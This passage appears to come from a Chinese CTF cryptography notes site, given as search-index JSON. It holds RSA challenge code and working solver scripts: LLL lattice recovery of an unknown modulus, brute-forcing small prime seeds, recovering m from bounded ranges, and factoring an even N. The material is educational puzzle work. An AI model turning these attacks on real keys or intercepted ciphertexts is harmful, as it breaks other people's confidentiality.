getPrime(nbits // 2)     q = getPrime(nbits // 2)     n = p*q     e = [random.getrandbits(nbits // 4) for _ in range(3)]     return n,e</p> <p>def encrypt2(message,e,n):     m = bytes_to_long(message)     c = [int(pow(m,e[i],n)) for i in range(len(e))]     return c</p> <p>assert flag.startswith(b\"DRKCTF{\")</p> <p>flag1 = flag[:len(flag)//2] flag2 = flag[len(flag)//2:]</p> <p>ebits = 7 e1 = generate_Key1(ebits) cipher1 = encrypt1(flag1,e1) print(\"e1 =\",e1) print(\"cipher1 =\",cipher1)</p> <p>nbits = 1024 n,e2 = generate_Key2(nbits) cipher2 = encrypt2(flag2,e2,n) print(\"e2 =\",e2) print(\"cipher2 =\",cipher2) print(\"n =\",n)</p> <p>\"\"\" e1 = [109, 71, 109, 73] cipher1 = [36272047346364825234770733058042613197790911431212158822254782055957208837848605160852567043492625692783344073921185227328379941291979083011033, 13421582077901767047291741873622169312010984740586925881415103229648835151589774736786336965745532072099996467445790339749720696886313635920080, 36272047346364825234770733058042613197790911431212158822254782055957208837848605160852567043492625692783344073921185227328379941291979083011033, 41425183140413487232780768389488969603566343428250573532166425276868000949579663990819005141199597640625439816343697426958648927294289659127871] e2 = [79572758141493570128961125255246129069540961757778793209698370333142346488381, 80555585862127636800866563977080055603517001358195529410497461746213789997225, 44651921320695090688745333790065512192118202496468714141526113242887125432380] cipher2 = [58600444300331800249882073146233995912287198739549440714207984476331259754331716531491187240053630185776787152600165426285021284302994699108557023545574315706006132536588848833818758624067461985444940651823107522770906474037882323326792755635934081822967331031854184791299228513024491344725765476710816941057, 16511944800191885973496391252612222059697387587833308714567450121364756390806094606646424594583975159634952911600665271092389815248477961923357683297311169260578508157717777465241680062644118354471550223231057620392252324514411927096940875466794869671163453991620492008856178108060167556176019729800517994337, 80885008609388989196377721090246742575908473911131498982960117640742106565184297197238656375198284856442596226398287448931285735903463892735111244609358611618958293002176923706195402338331128766464276441210238388187625107435781170368017908610916585774514676482124401329575553658828115269495158818527164441546] n = 93468142044831350317940409833603031534515663349871776634867176846669780024082517910566484997161088199091160371537367121403194814422867749777235397168852158723228851090445429617275680206703935781244466363279841409768649097588586494453125840436600639420286950914680651600232197982546122764845043227394567787283 \"\"\" <pre><code>\u4e24\u6bb5 flag\uff0c\u5148\u770b\u7b2c\u4e00\u6bb5\uff0c[\u53c2\u8003\u6587\u7ae0\u811a\u672c](https://tangcuxiaojikuai.xyz/post/39588.html)\n</code></pre> \u4e00\u4e2a 64 bit\u7684\u5c0f\u91cf m\uff0c\u4f9d\u6b21\u4ea7\u751f 20 \u4e2a 128 bit\u7684\u7d20\u6570\u5bf9\u5176\u8fdb\u884c\u7c7b\u4f3c RSA \u7684\u52a0\u5bc6\uff0c\u5e76\u4e14\u7ed9\u4e86\u6211\u4eec\u52a0\u5bc6\u6307\u6570\u7684\u5217\u8868\u4ee5\u53ca\u5bc6\u6587\u7684\u5217\u8868</p> <p>\u9898\u76ee\u6ee1\u8db3\u4e24\u4e2a\u7ecf\u5178\u6761\u4ef6\uff1a\u5b58\u5728\u5c0f\u91cf\uff0c\u63d0\u4f9b\u591a\u4e2a\u65b9\u7a0b\u7ec4\u53c2\u6570</p> <p>\u8fd9\u6837\u7684\u95ee\u9898\u5728\u5f88\u591a crypto \u9898\u76ee\u4e2d\u90fd\u662f\u7528\u683c\u65b9\u6cd5\u6c42\u89e3\u7684\uff0c\u6240\u4ee5\u8981\u60f3\u5230\u5229\u7528\u683c\u65b9\u6cd5\uff08\u9898\u76ee\u7684\u540d\u5b57\u867d\u7136\u8bf4\u5f97\u5f88\u660e\u767d\uff0c\u4f46\u662f\u5982\u679c\u6ca1\u6709\uff0c\u770b\u5230\u8fd9\u79cd\u5f62\u5f0f\u4e5f\u5e94\u8be5\u8054\u60f3\u5230\u8fd9\u4e2a\u65b9\u6cd5\uff09</p> <p>\u6ce8\u610f\u5230 m \u4e0d\u53d8\uff0c\u6a21\u6570 n \u4e5f\u4e0d\u53d8\uff0c\u540c\u65f6\u52a0\u5bc6\u6307\u6570\u4e92\u7d20\uff0c\u8fd9\u5176\u5b9e\u5f88\u50cf\u5171\u6a21\u653b\u51fb\u7684\u60c5\u666f\uff0c\u53ea\u662f n \u672a\u77e5</p> <p>\u56de\u60f3\u4e00\u4e0b\u5728\u5df2\u77e5\u6a21\u6570 n \u7684\u60c5\u51b5\u4e0b\u5171\u6a21\u653b\u51fb\u7684\u5b9e\u65bd\u65b9\u6cd5\uff0c\u4e0d\u96be\u4ea7\u751f\u4e0b\u9762\u8fd9\u4e2a\u89e3\u9898\u601d\u8def</p> <p>\u53d6 20 \u4e2a\u65b9\u7a0b\u7684\u524d\u4e09\u4e2a\u5982\u4e0b\uff1a <pre><code>$$\n\\begin{aligned}\n&amp;out1\\ =\\ m^{e1}\\ (mod\\ n)\\\\\\\\\n&amp;out2\\ =\\ m^{e2}\\ (mod\\ n)\\\\\\\\\n&amp;out3\\ =\\ m^{e3}\\ (mod\\ n)\\\\\\\\\n\\end{aligned}\n$$\n</code></pre> \uff08\u8d1d\u7ec4\u5b9a\u7406\uff09\u56e0\u4e3a e1\uff0ce2 \u4e92\u7d20\uff0c\u6240\u4ee5\u5b58\u5728 a\uff0cb\uff0c\u4f7f\u5f97\uff1a <pre><code>$$\n\\begin{aligned}\n&amp;a\\ *\\ e1\\ +\\ b\\ *\\ e2\\ =\\ 1\n\\end{aligned}\n$$\n</code></pre> \u6240\u4ee5\u53ef\u4ee5\u5f97\u5230\uff1a <pre><code>$$\n\\begin{aligned}\n&amp;out1^a\\ *\\ out2^b\\ \\equiv\\ m^{a\\ *\\ e1\\ +\\ b\\ *\\ e2}\\ \\equiv\\ m\\ (mod\\ n)\n\\end{aligned}\n$$\n</code></pre> \u8fd9\u6709\u4ec0\u4e48\u7528\u5462\uff1f\u6211\u4eec\u540c\u6837\u4e5f\u5bf9 2\u30013 \u4e24\u5f0f\uff0c1\u30013 \u4e24\u5f0f\u8fdb\u884c\u8fd9\u6837\u7684\u64cd\u4f5c\uff0c\u7ed3\u5408\u4e0a\u9762\u8fd9\u4e2a\u5f0f\u5b50\u80fd\u5f97\u5230\u4e09\u7ec4\u6a21\u7b49\u5f0f\uff1a <pre><code>$$\n\\begin{aligned}\n&amp;out1^a\\ *\\ out2^b\\ \\equiv\\ m\\ (mod\\ n)\\ \\ \\ \\ \\ \\ \\ \\ \\ --1\\\\\\\\\n&amp;out1^c\\ *\\ out2^d\\ \\equiv\\ m\\ (mod\\ n)\\ \\ \\ \\ \\ \\ \\ \\ \\ --2\\\\\\\\\n&amp;out1^f\\ *\\ out2^g\\ \\equiv\\ m\\ (mod\\ n)\\ \\ \\ \\ \\ \\ \\ \\ \\ --3\\\\\\\\\n\\end{aligned}\n$$\n</code></pre> 1\u30012 \u5f0f\u4f5c\u5dee\uff0c2\u30013 \u5f0f\u4f5c\u5dee\uff0c\u5c31\u5f97\u5230\uff1a <pre><code>$$\n\\begin{aligned}\n&amp;out1^a\\ *\\ out2^b\\ -\\ out2^c\\ *\\ out3^d\\ \\equiv\\ 0\\ (mod\\ n)\\\\\\\\\n&amp;out1^f\\ *\\ out2^g\\ -\\ out2^c\\ *\\ out3^d\\ \\equiv\\ 0\\ (mod\\ n)\\\\\\\\\n\\end{aligned}\n$$\n</code></pre> \u800c\u73b0\u5728\u7b49\u5f0f\u5de6\u4fa7\u5df2\u7ecf\u6ca1\u6709\u672a\u77e5\u91cf\u4e86\uff08a,b,c,d,f,g \u5747\u80fd\u591f\u901a\u8fc7\u6269\u5c55\u6b27\u51e0\u91cc\u5f97\u6c42\u51fa\uff09\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u6c42\u89e3\u4ed6\u4eec\u7684 gcd \u5f97\u5230 n</p> <p>\u53ef\u4ee5\u8bf4\uff0c\u60f3\u5230\u8fd9\u4e2a\u601d\u8def\u7684\u65f6\u5019\u6211\u4e3a\u4e4b\u4e00\u632f\uff0c\u53ef\u60dc\u5b9e\u9645\u64cd\u4f5c\u7684\u65f6\u5019\u8fd9\u4e2a\u65b9\u6cd5\u5e76\u4e0d\u80fd\u5b9e\u65bd\uff0c\u539f\u56e0\u4e5f\u5f88\u7b80\u5355\uff0c\u6211\u4eec\u8fdb\u884c\u7684\u5e76\u975e\u6a21\u5e42\u8fd0\u7b97\uff0c\u800c\u662f\u666e\u901a\u5e42\u8fd0\u7b97\uff0c\u5e76\u4e14 a\uff0cb \u8fd9\u4e9b\u6307\u6570\u6570\u91cf\u7ea7\u5f88\u5927\uff08\u6ce8\u610f\u8fd9\u4e00\u70b9\uff09\uff0c\u6240\u4ee5\u662f\u5b8c\u5168\u6ca1\u6709\u529e\u6cd5\u7167\u8fd9\u4e2a\u601d\u8def\u89e3\u4e0b\u53bb\u7684</p> <p>\u8fd9\u65f6\u5019\u6211\u4e5f\u6ca1\u6709\u60f3\u5230\u600e\u4e48\u5229\u7528\u683c\uff0c\u6240\u4ee5\u8fdb\u5ea6\u4e5f\u505c\u6ede\u4e86\uff0c\u4e00\u5361\u5361\u5230\u4e86\u665a\u4e0a</p> <p>\u665a\u4e0a\u6211\u53cd\u590d\u601d\u8003\u7684\u65f6\u5019\uff0c\u53c8\u60f3\u5230\u4e86\u6211\u521a\u521a\u8bf4\u7684\u90a3\u4e00\u70b9\uff0c\u4e5f\u5c31\u662f\u5b9e\u65bd\u4e0d\u4e86\u5171\u6a21\u653b\u51fb\u7684\u539f\u56e0\uff0c\u5728\u4e8e\u6307\u6570\u7684\u6570\u91cf\u7ea7\u5f88\u5927\uff0c\u6ca1\u6709\u529e\u6cd5\u5e42\u8fd0\u7b97</p> <p>\u6211\u4e5f\u7a81\u7136\u8054\u60f3\u5230\u4e86 Lattic e\u4e2d LLL \u7b97\u6cd5\u7684\u91cd\u8981\u5e94\u7528\u2014\u2014\u6c42\u89e3\u6700\u77ed\u5411\u91cf</p> <p>\u90a3\u4e48\u4e00\u5207\u4e5f\u5c31\u8bf4\u5f97\u901a\u4e86\uff0c\u4e4b\u6240\u4ee5\u7ed9 20 \u4e2a\u7d20\u6570\u4f5c\u4e3a\u52a0\u5bc6\u6307\u6570\uff0c\u5c31\u662f\u53ef\u4ee5\u5e94\u7528\u4e8e\u683c\u5bc6\u7801\u4e2d\uff0c\u514b\u670d\u521a\u624d\u5171\u6a21\u653b\u51fb\u4e2d\u4e24\u4e24\u7ec4\u5408\u65f6\u8ba1\u7b97\u51fa\u7684 a\uff0cb \u8fc7\u5927\u7684\u95ee\u9898\u3002\u6240\u4ee5\u6784\u9020\u683c\u7684\u601d\u8def\u5c31\u6765\u4e86\uff1a</p> <p>\u56e0\u4e3a 20 \u4e2a\u6307\u6570 e \u5747\u4e92\u7d20\uff0c\u6240\u4ee5\u4e00\u5b9a\u5b58\u5728 a1\uff0ca2\uff0ca3\u2026a20\uff0c\u4f7f\u5f97 <pre><code>$$\n\\begin{aligned}\n&amp;a1\\ *\\ e1\\ +\\ a2\\ *\\ e2\\ +\\ a3\\ *\\ e3\\ +\u2026\u2026a20\\ *\\ e20\\ =\\ 1\n\\end{aligned}\n$$\n</code></pre> \u6240\u4ee5\u5217\u51fa\u7b49\u5f0f\uff1a <pre><code>$$\n\\begin{aligned}\n&amp;[a1\\ a2\\ a3\u2026\u2026a20]\\ *\\ []\\ =\\ [1\\ a1\\ a2\u2026\u2026a20]\n\\end{aligned}\n$$\n</code></pre> \u5f88\u660e\u663e\uff0c\u8fd9\u4e2a\u683c\u7b26\u5408\u6211\u4eec\u7684\u8981\u6c42\uff0c\u6211\u4eec\u53ea\u9700\u8981\u4ece\u89c4\u7ea6\u51fa\u6765\u7684\u77ed\u5411\u91cf\u4e2d\u6311\u51fa\u4e24\u7ec4\uff0c\u6309\u7406\u6765\u8bf4\uff0c\u6211\u4eec\u53ea\u9700\u8981\u7c7b\u4f3c\u7684\u8fdb\u884c\u521a\u624d\u7684\u5171\u6a21\u653b\u51fb\u5373\u53ef</p> <p>\u53ef\u662f\u5b9e\u9645\u64cd\u4f5c\u53c8\u9047\u5230\u4e86\u95ee\u9898\uff0c\u8fd9\u6837\u89c4\u7ea6\u51fa\u6765\u7684\u5411\u91cf\u7ec4\u662f\u8fd9\u6837\u7684\uff1a <pre><code>```shell\n[ 45 -58   5 -16  12  -7 -27  19   6  14  29 -23 -36  44 -15   1   8  14  -7  11  -9]\n[-14 -27  20   6 -40  20 -34  -2 -16  51  35 -23 -51  13   3 -21   0  17  11  -7   1]\n[ 15 -36 -21 -13   6  -7  -1 -59 -23  42 -33  15 -30  -4  39  26  41   1  19  10   9]\n[-23   4  49 -19  22  -9  24 -20 -20   3 -24   4 -43 -86  40  44  -1  -1  26  25   1]\n[ 72  15 -11 -19  26 -31 -56 -25   5  33 -27 -23  12  22  11  -1  21 -17  51 -31   9]\n[-35 -73  -8  19 -29  23  -3  20 -10  18  46  29  -9  69 -30   9 -64  13  10 -26   3]\n[ 20  46  12  -3  28  -1 -68  15   3 -21 -48 -20  43  54   9  14  -5   0 -44 -24   8]\n[ 49   0 -10   0 -46 -47  24  -2  13  10  -3  48  43 -28  -3  53 -15  -6  31 -23  12]\n[ -6   0   9  42 -49 -38   8  12   7  39  30 -26  18  37  28 -28   8   2 -67 -21 -15]\n[-56  23  22  29  -7 -19  19  -8   6  35   4  -8  22  -2 -44 -69  16  -8  -7 -45  21]\n[-21  16  34 -39  36   1  57 -30  -2  -2 -36  -9   9 -27   8 -31 -31  32  12  -2  15]\n[ -9  -7   6  40  32 -49 -26 -60  17   0 -13   7  25  57 -19  28  -3 -34  11 -12 -17]\n[-30 -13  28 -42   8 -46  56  33 -56 -40 -24   4  10  15  46  50 -13  18 -21  17  16]\n[-17 -11  -5  29  14   6 -13   4  42 -69  30   9   3 -37   5   7 -17  50   6  14 -38]\n[ 53 -12  16  36   1  38 -52  25 -10 -41  -3 -37   6 -12   1  -4 -25  41   5   1  29]\n[ -3   1  36  22   7  -5 -10  15 -10 -27  35 -60 -36   9 -57  33 -21  43  28 -44   8]\n[ 32 -26  18  -9  -5  37  -8   2 -36 -28  43  10 -32  37 -24 -70  22 -35  49  -2  31]\n[-33  15 -25   1 -40   3  -2 -32  15   9 -20 -27 -27  35  26  -1 -45 -12  45  23  36]\n[-17   0  18 -20 -75  -5  55  42  16   8 -45   5 -24 -20 -50 -11   0  27  40  18   8]\n[ 11   5  16  37  -2  -6  28  19 -21   5  -8  63  -8 -21  22 -23 -57  13  -5  15 -39]\n</code></pre></p> <pre><code>\u7b2c\u4e00\u5217\u5e76\u4e0d\u662f\u6211\u4eec\u60f3\u8981\u7684 1\uff0c\u8bf4\u660e\u7b2c\u4e00\u5217\u662f 1 \u7684\u5411\u91cf\u5bf9\u6bd4\u8d77\u6765\u957f\u5ea6\u5e76\u4e0d\u5c0f\n\n\u518d\u60f3\u4e00\u4e0b\u89c4\u7ea6\u7684\u76ee\u7684\uff0c\u5176\u5b9e\u5f88\u5bb9\u6613\u5c31\u80fd\u60f3\u901a\u7b2c\u4e00\u5217\u662f\u591a\u5c11\u5e76\u4e0d\u91cd\u8981\uff0c\u91cd\u8981\u7684\u662f\u77ed\u5411\u91cf\u7684\u7b2c\u4e00\u5217\u76f8\u540c\uff08\u8fd9\u4e00\u70b9\u975e\u5e38\u5bb9\u6613\u60f3\u901a\uff0c\u6ca1\u7406\u89e3\u7684\u8bdd\u4ed4\u7ec6\u60f3\u60f3\uff09\n\n\u800c\u8981\u8ba9\u4ed6\u4eec\u76f8\u540c\uff0c\u6700\u6709\u6548\u7684\u529e\u6cd5\u5c31\u662f\u8ba9\u4ed6\u4eec\u5747\u4e3a 0\uff0c\u60f3\u5230\u8fd9\u4e00\u70b9\u540e\uff0c\u5c31\u53ef\u4ee5\u5728\u683c\u7684\u7b2c\u4e00\u5217\u4e58\u4e0a\u4e00\u4e2a\u5927\u6570 K\uff0c\u4ece\u800c\u6709\u6548\u7684\u8c03\u6574\u4e00\u4e0b\u683c\uff0c\u5982\u4e0b\uff1a\n</code></pre> \\[ \\begin{aligned} &amp;[a1\\ a2\\ a3\u2026\u2026a20]\\ *\\ []\\ =\\ [1\\ a1\\ a2\u2026\u2026a20] \\end{aligned} \\] <pre><code>\u8fd9\u6837\u4e00\u6765\uff0c\u6700\u77ed\u5411\u91cf\u7684\u7b2c\u4e00\u5217\u5c31\u4e0d\u592a\u53ef\u80fd\u4e0d\u662f 0 \u4e86\uff08\u56e0\u4e3a\u4f1a\u5bf9\u5e94\u7684\u6269\u5927K\u500d\uff0c\u663e\u8457\u5730\u4f7f\u89c4\u7ea6\u5411\u91cf\u53d8\u957f\uff09\n\n\u6211\u6d4b\u8bd5\u51fa\u53d6 100 \u5de6\u53f3\u5373\u53ef\uff0c\u7136\u540e\u5c31\u53ef\u4ee5\u6c42\u89e3\u6700\u5927\u516c\u7ea6\u6570\uff08\u6b64\u65f6\u8fd8\u9700\u6ce8\u610f\u4e24\u70b9\u5c0f\u95ee\u9898\uff1a\u4e00\u662f\u89c4\u7ea6\u51fa\u7684\u77ed\u5411\u91cf\u6709\u8d1f\u6570\uff0c\u666e\u901a\u5e42\u8fd0\u7b97\u4e2d\u4f1a\u53d8\u6210\u5206\u6570\u5f62\u5f0f\uff0c\u901a\u5206\u81f3\u7b49\u5f0f\u53f3\u4fa7\u5373\u53ef\uff1b\u4e8c\u662f\u6c42\u5f97\u7684\u516c\u7ea6\u6570\u4ecd\u6709\u53ef\u80fd\u662f k \u500d\u7684 n\uff0c\u9700\u8981\u53bb\u9664\u4e00\u4e9b\u5c0f\u56e0\u5b50\uff09\uff0c\u6700\u7ec8\u5f97\u5230 n\n</code></pre> <pre><code>e= []\nc= []\n\n# step1\nL = Matrix(ZZ, 20, 21)\nfor i in range(20):\n    L[i,0] = e[i]*1000\n    L[i,i+1] = 1\nL = L.LLL()\n\nalist1 = L[0][1:]\nk1nl = 1\nk1nr = 1\nfor i in range(20):\n    if(alist1[i]&lt;0):\n        k1nr *= c[i]**(-alist1[i])\n    else:\n        k1nl *= c[i]**alist1[i]\nk1n = k1nl-k1nr\n\nalist2 = L[1][1:]\nk2nl = 1\nk2nr = 1\nfor i in range(20):\n    if(alist2[i]&lt;0):\n        k2nr *= c[i]**(-alist2[i])\n    else:\n        k2nl *= c[i]**alist2[i]\nk2n = k2nl-k2nr\n\nn = gcd(k1n,k2n)\n\nfor i in range(2,10000):\n    while(n % i == 0):\n        n //= i\n\n# \u68c0\u67e5\u4e00\u4e0b n \u7684\u957f\u5ea6\u662f\u5426\u4e3a 1024 bit\nprint(len(bin(n)[2:]))\nprint(n)\n</code></pre>"},{"location":"Crypto/Chapter6/6-2/","title":"\u89e3\u5bc6\u539f\u6587 m","text":""},{"location":"Crypto/Chapter6/6-2/#\u89e3\u5bc6\u539f\u6587-m","title":"\u89e3\u5bc6\u539f\u6587 m","text":"<pre><code>from gmpy2 import *\nfrom Crypto.Util.number import *\n\n\np = 9018588066434206377240277162476739271386240173088676526295315163990968347022922841299128274551482926490908399237153883494964743436193853978459947060210411\n\nq = 7547005673877738257835729760037765213340036696350766324229143613179932145122130685778504062410137043635958208805698698169847293520149572605026492751740223\n\ne = 65537\n\nc = 50996206925961019415256003394743594106061473865032792073035954925875056079762626648452348856255575840166640519334862690063949316515750256545937498213476286637455803452890781264446030732369871044870359838568618176586206041055000297981733272816089806014400846392307742065559331874972274844992047849472203390350\n\nn = q * p\n\nphi = (q - 1) * (p - 1)\n\nd = invert(e, phi)\n\nm = pow(c, d, n)\n\nprint(long_to_bytes(m))\n</code></pre>"},{"location":"Crypto/Chapter6/6-20/","title":"\u7206\u7834\u8fd8\u539f p\u3001q\uff08p\u3001q \u5747\u8f83\u5c0f\uff09","text":""},{"location":"Crypto/Chapter6/6-20/#\u7206\u7834\u8fd8\u539f-pqpq-\u5747\u8f83\u5c0f","title":"\u7206\u7834\u8fd8\u539f p\u3001q\uff08p\u3001q \u5747\u8f83\u5c0f\uff09","text":"<p>\u9898\u76ee\u4ee3\u7801\u5982\u4e0b</p> <pre><code>from Crypto.Util.number import *\nfrom sympy import *\ndef givemeprime(x):\n    ''' x &lt; 502'''\n    p = getPrime(x)     # \u968f\u673a\u751f\u6210\u4e00\u4e2a\u5c0f\u7d20\u6570 p\uff0c\u4f4d\u6570\u4e3a x\n    print(p)\n    while (p).bit_length() &lt;= 512:      # \u4e0d\u65ad\u5c06 p \u6269\u5927\u5e76\u53d6\u4e0b\u4e00\u4e2a\u7d20\u6570\n        p = nextprime(p*2**10)\n\n    return p \n\np = givemeprime(10)     # \u521d\u59cb\u4f4d\u6570\u53ea\u6709 10 \u4f4d\nq = givemeprime(10)\nn = p*q\nflag=b'?????'\nm = bytes_to_long(flag)\ne=2**32+1\nc=pow(m,e,n)\n\nprint('n=',n)\nprint('c=',c)\n\n'''\nn= 9007989895621669259301762739598643626213892494330778168383286295463641223987867033273111296978959160408689408884183780314498828688143466136060628598819311509949865018608092450964012727526450914131409697944090166113416984201622940137239452703698919890772056684013237404520834408811118739546684092365102406400768733\nc= 3155015611586304247269005826733691392085437186284673630268852999607965592611252562808748872502491405722341353019602057980123546192900359248245073985988035982837057433789538035295585235536446429172802713235552248615722281314286849930993306403034865999074888279573724168174433746677852218329931104122667029131804586\n'''\n</code></pre> <p>\u56e0\u4e3a <code>p</code> \u548c <code>q</code> \u662f\u901a\u8fc7\u53ef\u63a7\u8fc7\u7a0b\u751f\u6210\u7684\uff08\u521d\u59cb\u4e3a\u5c0f\u7d20\u6570\uff0c\u7136\u540e\u53cd\u590d\u4e58\u4ee5 2 \u7684\u5e42\u518d\u53d6 nextprime\uff09</p> <p>\u6211\u4eec\u53ef\u4ee5 \u7a77\u4e3e\u521d\u59cb\u5c0f\u7d20\u6570\u503c\uff0c\u590d\u73b0 <code>givemeprime</code> \u51fd\u6570\uff0c\u518d\u5c1d\u8bd5\u662f\u5426\u5b58\u5728\u4e00\u7ec4 <code>(p, q)</code> \u4f7f\u5f97 <code>p * q == n</code></p> <pre><code>from Crypto.Util.number import *\nfrom sympy import *\nfrom tqdm import tqdm\n\n\ndef givemeprime(p):\n    ''' x &lt; 502'''\n    # p = getPrime(x)\n    while (p).bit_length() &lt;= 512:\n        p = nextprime(p * 2 ** 10)\n\n    return p\n\n\nn = 9007989895621669259301762739598643626213892494330778168383286295463641223987867033273111296978959160408689408884183780314498828688143466136060628598819311509949865018608092450964012727526450914131409697944090166113416984201622940137239452703698919890772056684013237404520834408811118739546684092365102406400768733\nc = 3155015611586304247269005826733691392085437186284673630268852999607965592611252562808748872502491405722341353019602057980123546192900359248245073985988035982837057433789538035295585235536446429172802713235552248615722281314286849930993306403034865999074888279573724168174433746677852218329931104122667029131804586\ne = 2 ** 32 + 1\n\nprimelist = [521, 523, 541, 547, 557, 563, 569, 571, 577, 587, 593, 599, 601, 607, 613, 617, 619, 631, 641, 643, 647,\n             653, 659, 661, 673, 677, 683, 691, 701, 709, 719, 727, 733, 739, 743, 751, 757, 761, 769, 773, 787, 797,\n             809, 811, 821, 823, 827, 829, 839, 853, 857, 859, 863, 877, 881, 883, 887, 907, 911, 919, 929, 937, 941,\n             947, 953, 967, 971, 977, 983, 991, 997, 1009, 1013, 1019, 1021]\n\nfor i in tqdm(range(len(primelist))):\n    for j in range(i, len(primelist)):\n        p = givemeprime(primelist[i])\n        q = givemeprime(primelist[j])\n        if p * q == n:\n            phi = (p - 1) * (q - 1)\n            d = inverse(e, phi)\n            m = pow(c, d, n)\n            print(long_to_bytes(m))\n        else:\n            pass\n</code></pre>"},{"location":"Crypto/Chapter6/6-21/","title":"\u7206\u7834\u8fd8\u539f m\uff08\u5df2\u77e5 m \u8303\u56f4\uff09","text":""},{"location":"Crypto/Chapter6/6-21/#\u7206\u7834\u8fd8\u539f-m\u5df2\u77e5-m-\u8303\u56f4","title":"\u7206\u7834\u8fd8\u539f m\uff08\u5df2\u77e5 m \u8303\u56f4\uff09","text":"<p>\u9898\u76ee\u4ee3\u7801\u5982\u4e0b</p> <pre><code>from Crypto.Util.number import *\nfrom sympy import *\n\n# p \u548c q \u662f 215 \u4f4d\u7684\u7d20\u6570\uff0c\u6240\u4ee5 n = p * q \u662f\u4e00\u4e2a\u5927\u6574\u6570\uff08430\u4f4d\uff09\np = getPrime(215)\nq = getPrime(215)\nn = p*q\ne = 73556\nflag= b'?????'\nm = bytes_to_long(flag)\n\n# nextprime(m) \u548c prevprime(m) \u8f93\u51fa\u7684\u662f\u79bb m \u6700\u8fd1\u7684\u4e24\u4e2a\u7d20\u6570\nprint(nextprime(m))\nprint(prevprime(m))\n\n# \u6ce8\u610f\u8fd9\u91cc\u7684 pow(n,e,m) \u770b\u4f3c\u52a0\u5bc6\uff0c\u5176\u5b9e\u662f\u53cd\u5e38\u64cd\u4f5c\nc = pow(n,e,m)\nprint('n=',n)\nprint('c=',c)\n\n'''\n40913285701005622718863058877533926183158872052161364026817991531\n40913285701005622718863058877533926183158872052161364026817991159\nn= 1613066479310413323265772296807266781564029043951746766617970255478050198763115133921086056086051610592970427572413404447990142013\nc= 34708409030920347254051748353430247487967281837305081753454451319\n'''\n</code></pre> \\[ \\begin{aligned} &amp;c\\ =\\ n^e\\ mod\\ m \\end{aligned} \\] <pre><code>from Crypto.Util.number import *\nfrom sympy import *\n\ne = 73556\nm_next = 40913285701005622718863058877533926183158872052161364026817991531\nm_priv = 40913285701005622718863058877533926183158872052161364026817991159\nn = 1613066479310413323265772296807266781564029043951746766617970255478050198763115133921086056086051610592970427572413404447990142013\nc = 34708409030920347254051748353430247487967281837305081753454451319\n\n# \u66b4\u529b\u7a77\u4e3e m \u5728 prevprime \u5230 nextprime \u4e4b\u95f4\u7684\u6240\u6709\u6574\u6570\uff08\u5dee\u503c\u5f88\u5c0f\uff0c\u51e0\u5341\u4e2a\uff09\nfor i in range(m_priv, m_next):\n    if c == pow(n, e, i):\n        print(i)\n        print(long_to_bytes(i))\n</code></pre>"},{"location":"Crypto/Chapter6/6-22/","title":"n \u4e3a\u5076\u6570\u63a8\u51fa p = 2","text":""},{"location":"Crypto/Chapter6/6-22/#n-\u4e3a\u5076\u6570\u63a8\u51fa-p--2","title":"n \u4e3a\u5076\u6570\u63a8\u51fa p = 2","text":"<p>\u8fdc\u7a0b\u8fde\u63a5\u53d1\u73b0\u53d1\u73b0\u751f\u6210\u7684 N \u5168\u90fd\u662f\u5076\u6570</p> <p></p> <p>RSA \u7684\u6838\u5fc3\u516c\u5f0f\u662f\uff1a</p> <p>N = p \u00d7 q</p> <p>\u5176\u4e2d\uff1a</p> <ul> <li>p \u548c q \u662f\u4e24\u4e2a \u5927\u7d20\u6570</li> <li>N \u662f\u5b83\u4eec\u7684\u4e58\u79ef\uff0c\u7528\u4f5c\u6a21\u6570</li> </ul> <p>\u6807\u51c6 RSA \u8981\u6c42\uff1a</p> <ul> <li>p \u548c q \u5747\u4e3a\u5927\u7d20\u6570</li> <li>\u4e14\u90fd\u5fc5\u987b\u662f\u5947\u6570\uff08\u56e0\u4e3a 2 \u4e4b\u5916\u7684\u6240\u6709\u7d20\u6570\u90fd\u662f\u5947\u6570\uff09</li> </ul> <p>\u5982\u679c N \u4e3a\u5076\u6570\u90a3\u8bf4\u660e p \u548c q \u4e2d\u6709\u4e00\u4e2a\u662f\u5076\u6570</p> <p>\u4f46\u552f\u4e00\u7684\u5076\u6570\u7d20\u6570\u662f 2</p> <p>\u6240\u4ee5 q \u6216 p \u6709\u4e00\u4e2a\u662f 2\uff0c\u8fd9\u6837\u6211\u4eec\u5c31\u80fd\u76f4\u63a5\u5206\u89e3 N</p> <pre><code>from Crypto.Util.number import inverse, long_to_bytes\n\n# \u4ece\u670d\u52a1\u83b7\u53d6\u7684\u53d8\u91cf\uff08\u793a\u4f8b\uff09\nN = 16749837321344130084550985102003550399956674386743058617704729879577640535719227688593462243296045193929408852118650789506962817745280185510940780886140638    # \u4ece nc \u63a5\u53e3\u83b7\u53d6 N\ne = 65537\nc = 1522623953839932043052285485369632549836987965181940792893751469951454437696221766465918033070039098071178026515952768796327963296844494680671840051296757    # \u4ece nc \u63a5\u53e3\u83b7\u53d6 ciphertext\n\n# \u5229\u7528 N \u662f\u5076\u6570\u7684\u7834\u7efd\np = 2\nq = N // p\n\n# \u8ba1\u7b97\u79c1\u94a5 d\uff0c\u5e76\u89e3\u5bc6\nphi = (p - 1) * (q - 1)\nd = inverse(e, phi)\nm = pow(c, d, N)\n\nflag = long_to_bytes(m).decode()\nprint(flag)\n</code></pre>"},{"location":"Crypto/Chapter6/6-23/","title":"\u63d0\u516c\u56e0\u6570 p \u6784\u9020\u7b80\u6613\u65b9\u7a0b\u6c42\u89e3","text":""},{"location":"Crypto/Chapter6/6-23/#\u63d0\u516c\u56e0\u6570-p-\u6784\u9020\u7b80\u6613\u65b9\u7a0b\u6c42\u89e3","title":"\u63d0\u516c\u56e0\u6570 p \u6784\u9020\u7b80\u6613\u65b9\u7a0b\u6c42\u89e3","text":"<p>\u9898\u76ee\u7ed9\u51fa\u4ee3\u7801</p> <pre><code>from Crypto.Util.number import *\nfrom secret import flag\n\ne = 65537\nm = bytes_to_long(flag.encode())\np, q, r = getPrime(512), getPrime(512), getPrime(512)\n\nn = p*q*r\nc = pow(m, e, n)\nprint(c)\nprint(n)\nprint(p+q+r)\nprint(p*q+p*r)\n</code></pre> <p>\u8f6c\u6362\u6210\u6570\u5b66\u516c\u5f0f $$ \\begin{aligned} &amp;n = p  q  r\\ &amp;t = p  q + p  r = p(q + r)\\ &amp;\u03d5(n) = (p - 1)(q - 1)(r - 1) \\end{aligned} $$ \u6211\u4eec\u53ef\u4ee5\u6e05\u695a\u5730\u770b\u5230\uff0cp \u662f n \u548c t \u7684\u516c\u5171\u56e0\u5b50</p> 